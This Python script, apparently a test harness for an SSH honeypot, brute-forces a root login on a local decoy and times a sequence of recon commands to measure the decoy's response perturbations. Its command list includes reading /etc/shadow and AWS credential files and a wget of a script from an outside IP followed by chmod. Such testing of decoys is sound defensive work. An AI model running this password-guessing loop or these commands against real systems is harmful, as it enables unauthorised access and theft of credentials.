"""Automated SSH bot against the decoy: brute-forces, logs in, runs a recon script,
and prints how response times shift as the perturbation regimes change.
Run: python -m scripts.bot_attacker [port]
"""
import sys
import time

import paramiko

PASSWORDS = ["hunter2", "letmein", "Winter2024!"]   # the decoy accepts the 3rd attempt
RECON = ["uname -a", "whoami", "id", "ps aux", "cat /etc/passwd", "ls -la", "cat ~/.aws/credentials",
         "wget http://198.51.100.7/x.sh", "chmod +x x.sh", "ls", "ifconfig", "cat /etc/shadow",
         "cd /tmp", "touch .x", "ls -la"]


def run_automated_attack(port: int = 2222):
    print("[*] Bot starting automated attack sequence...")
    for password in PASSWORDS:
        transport = paramiko.Transport(("127.0.0.1", port))
        transport.connect()
        try:
            transport.auth_password("root", password)
            print(f"[+] Logged in as root with '{password}'  (server: {transport.remote_version})")
            break
        except paramiko.AuthenticationException:
            print(f"[-] root:{password} rejected")
            transport.close()

    chan = transport.open_session()
    chan.get_pty()
    chan.invoke_shell()
    _read_until_prompt(chan)
    for i, cmd in enumerate(RECON, 1):
        start = time.time()
        chan.send(cmd + "\n")
        _read_until_prompt(chan)
        print(f"Command {i:02d} {cmd:32s} {(time.time() - start) * 1000:7.1f} ms")
        time.sleep(0.1)  # script processing time
    chan.send("exit\n")
    transport.close()
    print("[*] Bot attack complete.")


def _read_until_prompt(chan, timeout: float = 10.0):
    buf, deadline = b"", time.time() + timeout
    while time.time() < deadline and not buf.endswith((b"# ", b"$ ")):
        if chan.recv_ready():
            buf += chan.recv(4096)
        else:
            time.sleep(0.01)
    return buf


if __name__ == "__main__":
    run_automated_attack(int(sys.argv[1]) if len(sys.argv) > 1 else 2222)
